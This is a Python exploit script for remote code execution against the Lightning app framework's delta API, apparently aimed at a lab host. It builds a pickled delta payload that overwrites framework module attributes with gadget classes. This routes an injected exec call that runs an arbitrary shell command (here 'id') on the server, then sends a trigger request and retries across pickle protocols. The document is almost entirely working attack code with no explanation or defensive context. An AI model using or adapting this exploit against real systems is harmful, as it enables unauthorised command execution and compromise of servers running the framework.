import requests, time, pickle, pickletools, json
from collections import namedtuple

# Create a custom class to replace OrderedSet functionality
class BypassClass:
    def __init__(self, *args):
        self.items = list(args) if args else []
    
    def __iter__(self):
        return iter(self.items)
    
    def __contains__(self, item):
        return item in self.items
    
    def __reduce__(self, *args):
        return (BypassClass, ())
    
    def add(self, item):
        if item not in self.items:
            self.items.append(item)

# Helper class to construct getitem and getattr paths easier
class Root:
    def __init__(self, path=None):
        self.path = path or []

    def __getitem__(self, item):
        return self.__class__(self.path + [('GET', repr(item))])

    def __getattr__(self, attr):
        return self.__class__(self.path + [('GETATTR', repr(attr) if attr.startswith('__') else attr)])
    
    def __str__(self):
        return ''.join(
            ['root'] + \
            [
                f'.{item}' 
                if typ == 'GETATTR' else 
                f'[{item}]' 
                for typ, item in self.path
            ]
        )

    def __reduce__(self, *args):
        return str, (str(self),)

def send_delta(d, attempt=1):
    print(f"[DEBUG] Attempt {attempt}: Sending delta payload...")
    print(f"[DEBUG] Payload type: {type(d)}")
    
    try:
        # Try sending as raw pickle data first
        headers = {
            'x-lightning-type': '1',
            'x-lightning-session-uuid': '1',
            'x-lightning-session-id': '1',
            'Content-Type': 'application/json'
        }
        
        # Prepare the data - try different formats
        if attempt == 1:
            # Original format
            data = {"delta": d}
        elif attempt == 2:
            # Try without the delta wrapper
            data = d
        elif attempt == 3:
            # Try with different content type
            headers['Content-Type'] = 'application/octet-stream'
            data = pickle.dumps({"delta": d})
        else:
            # Try raw pickle in JSON
            data = {"delta": d.decode('latin-1') if isinstance(d, bytes) else str(d)}
        
        print(f"[DEBUG] Request headers: {headers}")
        print(f"[DEBUG] Data type: {type(data)}")
        
        response = requests.post(
            server_host + '/api/v1/delta', 
            headers=headers, 
            json=data if attempt in [1, 2, 4] else data,
            timeout=10
        )
        
        print(f"[DEBUG] Response Status Code: {response.status_code}")
        print(f"[DEBUG] Response Headers: {dict(response.headers)}")
        
        if response.status_code != 200:
            print(f"[ERROR] Server returned status: {response.status_code}")
            print(f"[ERROR] Response text: {response.text[:500]}")  # Limit output
        else:
            print(f"[SUCCESS] Delta accepted with status 200")
            
        return response
        
    except requests.exceptions.ConnectionError as e:
        print(f"[ERROR] Connection failed: {e}")
        return None
    except requests.exceptions.Timeout as e:
        print(f"[ERROR] Request timed out: {e}")
        return None
    except Exception as e:
        print(f"[ERROR] Unexpected error: {e}")
        import traceback
        print(f"[ERROR] Traceback: {traceback.format_exc()}")
        return None

def test_connection():
    """Test if the server is accessible"""
    print("[INFO] Testing server connection...")
    try:
        response = requests.get(server_host, timeout=5)
        print(f"[INFO] Server root status: {response.status_code}")
        return True
    except Exception as e:
        print(f"[ERROR] Cannot connect to server: {e}")
        return False

# Main execution
if __name__ == "__main__":
    server_host = 'http://ml-api.pytorch-lab.internal:7501'
    server_host =  server_host
    command = 'id'

    if not test_connection():
        print("[ERROR] Cannot proceed - server unavailable")
        exit(1)

    print("[INFO] Building exploit payload...")
    root = Root()

    try:
        # This is why we add `namedtuple` to the root scope, it provides easy access to the `sys` module
        sys = root['function'].__globals__['_sys']
        bypass_isinstance = BypassClass()

        # this code is injected and ran on the remote host
        injected_code = f"__import__('os').system({command!r})" + '''
import lightning, sys
from lightning.app.api.request_types import _DeltaRequest, _APIRequest
lightning.app.core.app._DeltaRequest = _DeltaRequest
from lightning.app.structures.dict import Dict
lightning.app.structures.Dict = Dict
from lightning.app.core.flow import LightningFlow
lightning.app.core.LightningFlow = LightningFlow
LightningFlow._INTERNAL_STATE_VARS = {"_paths", "_layout"}
lightning.app.utilities.commands.base._APIRequest = _APIRequest
del sys.modules['lightning.app.utilities.types']'''

        delta = {
            'attribute_added': {
                root['function']: namedtuple,
                root['bypass_isinstance']: bypass_isinstance,
                root['bypass_isinstance'].__instancecheck__: str,
                sys.modules['lightning.app'].core.app._DeltaRequest: str,
                sys.modules['lightning.app'].structures.Dict: dict,
                sys.modules['typing'].Union: list,
                sys.modules['lightning.app'].core.LightningFlow: bypass_isinstance,
                sys.modules['lightning.app'].utilities.types.ComponentTuple: bypass_isinstance,
                sys.modules['lightning.app'].core.flow.LightningFlow._INTERNAL_STATE_VARS: (),
                sys.modules['lightning.app'].utilities.commands.base._APIRequest: bypass_isinstance,
                sys.modules['lightning.app'].api.request_types._DeltaRequest.name: "root.__init__.__builtins__.exec",
                sys.modules['lightning.app'].api.request_types._DeltaRequest.method_name: "__call__",
                sys.modules['lightning.app'].api.request_types._DeltaRequest.args: (injected_code,),
                sys.modules['lightning.app'].api.request_types._DeltaRequest.kwargs: {},
                sys.modules['lightning.app'].api.request_types._DeltaRequest.id: "root"
            }
        }

        print("[INFO] Serializing payload...")
        # Try different pickle protocols
        for protocol in [1, 2, 3, 4]:
            print(f"[INFO] Trying pickle protocol {protocol}...")
            try:
                payload = pickletools.optimize(pickle.dumps(delta, protocol))
                payload_str = payload.decode('latin-1')
                payload_str = payload_str.replace('__builtin__', 'builtins').replace('unicode', 'str')
                
                print(f"[INFO] Payload size: {len(payload_str)} characters")
                
                # Try multiple attempts with different formats
                for attempt in range(1, 5):
                    response = send_delta(payload_str, attempt)
                    if response and response.status_code == 200:
                        print(f"[SUCCESS] Payload delivered with protocol {protocol}, attempt {attempt}")
                        
                        print("[INFO] Waiting before sending trigger...")
                        time.sleep(1)
                        
                        print("[INFO] Sending trigger delta...")
                        trigger_response = send_delta("", attempt)
                        
                        if trigger_response and trigger_response.status_code == 200:
                            print("[SUCCESS] Exploit sequence completed!")
                        else:
                            print("[WARNING] Trigger may have failed")
                        
                        break
                    else:
                        print(f"[INFO] Protocol {protocol}, attempt {attempt} failed, trying next...")
                
                if response and response.status_code == 200:
                    break
                    
            except Exception as e:
                print(f"[ERROR] Protocol {protocol} failed: {e}")
                continue
                
    except Exception as e:
        print(f"[ERROR] Payload construction failed: {e}")
        import traceback
        print(f"[ERROR] Traceback: {traceback.format_exc()}")
